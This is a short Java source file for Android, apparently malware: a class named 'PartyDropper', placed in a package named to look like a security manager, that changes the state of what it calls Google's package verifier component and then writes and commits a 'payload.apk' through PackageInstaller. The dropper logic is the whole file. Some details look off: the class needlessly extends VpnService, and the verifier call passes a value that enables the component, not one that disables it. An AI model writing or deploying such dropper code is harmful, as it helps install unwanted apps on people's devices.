package com.secure.android.manager;
import android.net.VpnService;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageInstaller;
class PartyDropper extends VpnService {
 void install(Context context, java.io.File apk, android.content.IntentSender result) throws Exception {
  context.getPackageManager().setComponentEnabledSetting(new ComponentName("com.google.android.verifier", "com.google.android.verifier.integration.VerifierService"), 1, 1);
  PackageInstaller installer = context.getPackageManager().getPackageInstaller();
  PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
  int sessionId = installer.createSession(params);
  PackageInstaller.Session session = installer.openSession(sessionId);
  try (java.io.InputStream src = new java.io.FileInputStream(apk);
       java.io.OutputStream dst = session.openWrite("payload.apk", 0, apk.length())) {
   byte[] block = new byte[4096]; int length;
   while ((length = src.read(block)) > 0) dst.write(block, 0, length);
   session.fsync(dst);
  }
  session.commit(result);
 }
}
